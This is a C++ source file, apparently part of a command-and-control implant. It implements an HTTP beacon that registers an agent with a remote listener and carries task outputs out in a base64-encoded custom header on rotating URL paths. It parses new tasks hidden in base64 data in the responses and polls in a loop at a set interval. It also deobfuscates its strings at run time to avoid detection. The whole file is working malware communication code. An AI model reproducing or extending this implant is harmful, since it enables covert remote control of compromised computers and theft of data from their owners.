#include <Windows.h>
#include "communicators/http.h"
#include "utils/buffer.h"
#include "utils/winapi.h"
#include "communicators/base.h"
#include "utils/web_requestor.h"

/* Constructor; for initialisation */

HttpCommunicator::HttpCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR pUrlPathChoices, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pEventRegister, Event *pEventAgentShouldStop, DWORD communicationIntervalMs)
    : BaseCommunicator(pWinApiCustom, host, port, agentId, pTaskInputQueue, pTaskOutputQueue, pEventRegister, pEventAgentShouldStop),
      pUrlPathChoices(pUrlPathChoices),
      urlPathChoicesNum(NullSeparatedArrayNumOfStringElements(pUrlPathChoices)),
      lastUrlPathChoiceIndex(-1),
      communicationIntervalMs(communicationIntervalMs)
{
}

/* Destructor; for cleanup */
HttpCommunicator::~HttpCommunicator()
{
}

/* Communicate once with Listener, to send back Task outputs and retrieve new Tasks */
void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
{
    // Initialise buffer variables
    LPVOID pBufferB64ToSend = NULL;
    LPVOID communicationHeaderBuffer = NULL;
    LPVOID pResponseBuffer = NULL;
    LPVOID dataBase64 = NULL;
    LPVOID data = NULL;

    // Get URL path to query
    PCHAR urlPath = NullSeparatedArrayStringAt(
        this->pUrlPathChoices,
        (this->lastUrlPathChoiceIndex + 1) % this->urlPathChoicesNum);
    ++this->lastUrlPathChoiceIndex;

    // Prepare data to send

    //// Get the raw data
    this->PrepareDataForCommunicateOnceWithListener(forRegistration);
    if (this->communicateWithListenerDataSize == 0)
        goto CLEANUP;

    //// Prepare buffer for base64 encoded result of raw data
    DWORD bufferB64ToSendSize = (((this->communicateWithListenerDataSize + 2) / 3) * 4);
    pBufferB64ToSend = this->pWinApiCustom->HeapAllocCustom(bufferB64ToSendSize + 1);

    if (pBufferB64ToSend == NULL || bufferB64ToSendSize == 0)
        goto CLEANUP;

    if (!Base64Encode(
            (PUCHAR)(this->pCommunicateWithListenerData),
            this->communicateWithListenerDataSize,
            (PCHAR)pBufferB64ToSend))
        goto CLEANUP;

    //// Prepare the data in the HTTP header
    static CHAR strHttpCommunicationHeaderName[STRING_HTTP_COMMUNICATION_HEADER_LEN + 1] = ""; // "HTTP-X-AUTH"
    DeobfuscateUtf8String(
        (PCHAR)STRING_HTTP_COMMUNICATION_HEADER,
        STRING_HTTP_COMMUNICATION_HEADER_LEN,
        strHttpCommunicationHeaderName);

    DWORD communicationHeaderBufferSize = STRING_HTTP_COMMUNICATION_HEADER_LEN + 2 + bufferB64ToSendSize; // "HTTP-X-AUTH" + ": " + "BASE64_DATA"
    communicationHeaderBuffer = this->pWinApiCustom->HeapAllocCustom(communicationHeaderBufferSize + 1);
    if (communicationHeaderBuffer == NULL)
        goto CLEANUP;

    ConcatString((PCHAR)communicationHeaderBuffer, strHttpCommunicationHeaderName);
    ConcatString((PCHAR)communicationHeaderBuffer, ": ");
    ConcatString((PCHAR)communicationHeaderBuffer, (PCHAR)pBufferB64ToSend);

    // Initialise response size
    DWORD responseSize = 0;

    // Send web request
    DWORD sendWebRequestReturnVal = SendWebRequest(
        this->pWinApiCustom,
        FALSE,
        "GET",
        this->listenerHost,
        this->listenerPort,
        urlPath,
        (PCHAR)communicationHeaderBuffer, // "HTTP-X-AUTH: base64(data_to_send)",
        &pResponseBuffer,
        &responseSize,
        1024);

    if (sendWebRequestReturnVal != 0 || responseSize == 0)
        goto CLEANUP;

    // From response, extract actual Data; ";base64," + DATA_B64 + "\""
    static CHAR strMimeBase64[STRING_MIME_BASE64_LEN + 1] = ""; // ";base64,"
    DeobfuscateUtf8String(
        (PCHAR)STRING_MIME_BASE64,
        STRING_MIME_BASE64_LEN,
        strMimeBase64);

    DWORD dataBase64IndexStart = StringSearchSubstring(strMimeBase64, (PCHAR)pResponseBuffer);
    if (dataBase64IndexStart == -1)
        goto CLEANUP;
    dataBase64IndexStart += StrLen(strMimeBase64);

    DWORD dataBase64IndexEnd = StringSearchSubstring("\"", (PCHAR)pResponseBuffer + dataBase64IndexStart);
    if (dataBase64IndexEnd == -1)
        goto CLEANUP;
    dataBase64IndexEnd = dataBase64IndexEnd + dataBase64IndexStart - 1;

    if (dataBase64IndexStart >= dataBase64IndexEnd)
        goto CLEANUP;

    DWORD dataBase64Size = dataBase64IndexEnd - dataBase64IndexStart + 1;
    dataBase64 = this->pWinApiCustom->HeapAllocCustom(dataBase64Size + 1);
    if (dataBase64 == NULL)
        goto CLEANUP;
    CopyBuffer(dataBase64, (PCHAR)pResponseBuffer + dataBase64IndexStart, dataBase64Size);

    DWORD dataSize = 0;
    data = this->pWinApiCustom->HeapAllocCustom(((dataBase64Size / 4) * 3) + 1);
    if (data == NULL)
        goto CLEANUP;

    if (!Base64Decode((PCHAR)dataBase64, (PUCHAR)data, &dataSize))
        goto CLEANUP;

    // Process actual data
    if ((data != NULL) && (dataSize != 0))
    {
        this->ProcessResponseFromCommunicateOnceWithListener(data, dataSize);
    }

CLEANUP:
    if (pBufferB64ToSend != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(pBufferB64ToSend);
    }

    if (communicationHeaderBuffer != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(communicationHeaderBuffer);
    }

    if (pResponseBuffer != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(pResponseBuffer);
    }

    if (dataBase64 != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(dataBase64);
    }

    if (data != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(data);
    }
}

/* Starts communicator thread */
void WINAPI HttpCommunicator::StartCommunicatorThread(HttpCommunicatorThreadArgs *pHttpCommunicatorThreadArgs)
{
    // Create instance of Http communicator
    HttpCommunicator httpCommunicator = HttpCommunicator(
        pHttpCommunicatorThreadArgs->pWinApiCustom,
        pHttpCommunicatorThreadArgs->listenerHost,
        pHttpCommunicatorThreadArgs->listenerPort,
        pHttpCommunicatorThreadArgs->pUrlPathChoices,
        pHttpCommunicatorThreadArgs->agentId,
        pHttpCommunicatorThreadArgs->pTaskInputQueue,
        pHttpCommunicatorThreadArgs->pTaskOutputQueue,
        pHttpCommunicatorThreadArgs->pEventRegister,
        pHttpCommunicatorThreadArgs->pEventAgentShouldStop,
        pHttpCommunicatorThreadArgs->communicationIntervalMs);

    // Invoke StartCommunication()
    httpCommunicator.StartCommunication();
}

/* Starts and maintains Communication with Listener; invoked internally by StartCommunicatorThread() */
void HttpCommunicator::StartCommunication()
{
    // Register Agent

    //// Prepare and store registration data
    this->QueueRegistrationDataAsFirstAgentOutput();

    //// Communicate once with Listener
    this->CommunicateOnceWithListener(TRUE);

    //// Check if new Task queue contains registration confirmation; "REGISTERED-123ABC"; remove this from the queue
    if (!this->IsAgentRegistrationSuccessful())
        goto CLEANUP;

    //// Set registration event
    if (!this->pEventRegister->Set())
        goto CLEANUP;

    // Start persistent communication in loop
    while (TRUE)
    {
        // Communicate with Listener; get new Tasks and submit previous Task outputs
        this->CommunicateOnceWithListener(FALSE);

        // Wait for event to check if agent should stop; this also sleeps for required amount of interval
        if (this->pEventAgentShouldStop->Wait(this->communicationIntervalMs) == WAIT_OBJECT_0)
            break;
    }

    // Cleanup
CLEANUP:
    return;
}